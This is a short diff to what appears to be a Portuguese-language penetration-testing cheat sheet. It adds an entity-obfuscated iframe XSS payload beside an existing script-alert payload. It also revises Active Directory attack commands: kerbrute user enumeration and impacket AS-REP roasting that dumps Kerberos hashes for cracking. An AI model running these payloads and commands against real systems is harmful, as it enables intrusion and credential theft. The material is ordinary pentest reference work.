@@ -89,6 +89,10 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 
 .
 
+	<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"></iframe>
+
+.
+
 	<script>alert('Pentester')</script>
 
 .
@@ -9092,7 +9096,7 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 	sudo nano /etc/resolv.conf && echo "COLOCA O IP DO/S SERVIDOR/ES DNS"
     sudo net time set -S IP-DC
 	kerbrute userenum -d floripa.local --dc 192.168.161.100 /usr/share/wordlists/users-pt-br.txt -o valid-users-dump
-    impacket-GetNPUsers brasil.floripa.local/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast - SALVA HASHES DO TIPO krbtg5 e -m 18200 
+    impacket-GetNPUsers DOMAIN.LOCAL/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast && echo "SALVA HASHES DO TIPO krbtg5 e -m 18200"
 
 `Kerberoasting` PRECISA TER UMA CREDENCIAL VALIDA PARA FAZER ESSE TIPO DE ATAQUE
 
